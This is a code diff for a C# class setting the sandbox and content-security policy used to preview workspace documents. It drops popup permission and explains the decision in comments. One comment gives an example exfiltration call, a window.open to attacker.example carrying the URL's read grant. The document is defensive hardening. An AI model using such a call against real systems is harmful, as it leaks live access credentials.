@@ -36,16 +36,25 @@ public static class WorkspaceContentTypes
     /// <para>
     /// The other tokens are each doing a job: <c>allow-scripts</c> and <c>allow-forms</c> because a generated
     /// report that cannot run its own chart script or render a form is not a preview of that report;
-    /// <c>allow-popups</c> because a popup INHERITS the sandbox, so blocking it buys nothing;
     /// <c>allow-modals</c> because <c>alert()</c>/<c>confirm()</c> add annoyance, not reach — a document that
     /// already has <c>allow-scripts</c> can spin the CPU regardless, and dropping it silently breaks ordinary
     /// pages. <c>base-uri 'none'</c> stops the document rewriting its own base URL to somewhere the grant in
     /// its path would be sent; <c>form-action 'none'</c> pairs with <c>allow-forms</c> so forms render but
     /// submit nowhere; <c>frame-ancestors 'self'</c> keeps this app the only framer.
     /// </para>
+    /// <para>
+    /// <c>allow-popups</c> is ABSENT, and the argument that it is harmless because a popup inherits the
+    /// sandbox misses what is being protected. The document's own URL contains the grant, so
+    /// <c>window.open('https://attacker.example/?g=' + location.pathname)</c> exfiltrates a live read
+    /// credential for this workspace — and a sandboxed popup navigating away is still a navigation, which no
+    /// CSP directive here can stop (<c>navigate-to</c> was removed from CSP3, and <c>default-src</c> governs
+    /// fetches, not top-level navigations). Losing it costs a workspace page its <c>target="_blank"</c>
+    /// links; opening the document full-size stays available as a button this app renders OUTSIDE the frame,
+    /// where no workspace script can reach it.
+    /// </para>
     /// </remarks>
     public const string SandboxPolicy =
-        "sandbox allow-scripts allow-forms allow-popups allow-modals; "
+        "sandbox allow-scripts allow-forms allow-modals; "
         + "default-src 'self' data: blob:; "
         + "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
         + "style-src 'self' 'unsafe-inline' data:; "
@@ -62,6 +71,12 @@ public static class WorkspaceContentTypes
     /// it is fetched by a document that already carries its own CSP, and a <c>sandbox</c> directive on a
     /// subresource response neither travels to that document nor means anything on its own.
     /// </summary>
+    /// <remarks>
+    /// <c>application/pdf</c> was considered and deliberately excluded. A PDF can carry JavaScript, but
+    /// Chrome's and Firefox's built-in viewers already run it isolated from the embedding page, while
+    /// sandboxing the response degrades the viewer's own chrome (toolbar, download, print) that the user is
+    /// there to use. Revisit if a deployment ever serves PDFs to a browser without an isolating viewer.
+    /// </remarks>
     private static readonly HashSet<string> ActiveDocumentTypes = new(StringComparer.OrdinalIgnoreCase)
     {
         "text/html",
